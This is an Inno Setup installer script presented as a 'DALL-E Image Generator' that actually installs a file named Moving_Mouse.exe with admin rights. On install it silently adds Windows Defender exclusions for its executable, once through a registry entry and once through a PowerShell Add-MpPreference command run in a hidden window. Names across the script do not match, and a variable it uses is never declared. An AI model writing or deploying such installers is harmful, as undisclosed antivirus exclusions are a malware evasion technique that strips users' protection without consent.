[Setup]
AppName=DALL-E Image Generator
AppVersion=1.0.0
AppPublisher=Dipankar Boruah
DefaultDirName={pf}\Moving_Mouse
DefaultGroupName=Moving_Mouse
OutputDir=installer
OutputBaseFilename=Moving_Mouse_Setup
Compression=lzma2/ultra64
SolidCompression=yes
UninstallDisplayIcon={app}\Moving_Mouse.exe
PrivilegesRequired=admin

[Files]
Source: "dist\Moving_Mouse.exe"; DestDir: "{app}"; Flags: ignoreversion
Source: "README.txt"; DestDir: "{app}"; Flags: ignoreversion

[Icons]
Name: "{group}\Moving_Mouse Generator"; Filename: "{app}\Moving_Mouse.exe"
Name: "{commondesktop}\Moving_Mouse Generator"; Filename: "{app}\Moving_Mouse.exe"

[Registry]
Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"; ValueType: string; ValueName: "{app}\DallE3_ImageGenerator.exe"; ValueData: "0"; Flags: uninsdeletevalue; Check: IsAdminInstallMode

[Code]
procedure CurStepChanged(CurStep: TSetupStep);
begin
    if CurStep = ssPostInstall then
    begin
        // Add to Windows Defender exclusions
        Exec(ExpandConstant('{sys}\WindowsPowerShell\v1.0\powershell.exe'),
             '-Command Add-MpPreference -ExclusionPath "' + ExpandConstant('{app}\Moving_Mouse.exe') + '"',
             '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    end;
end;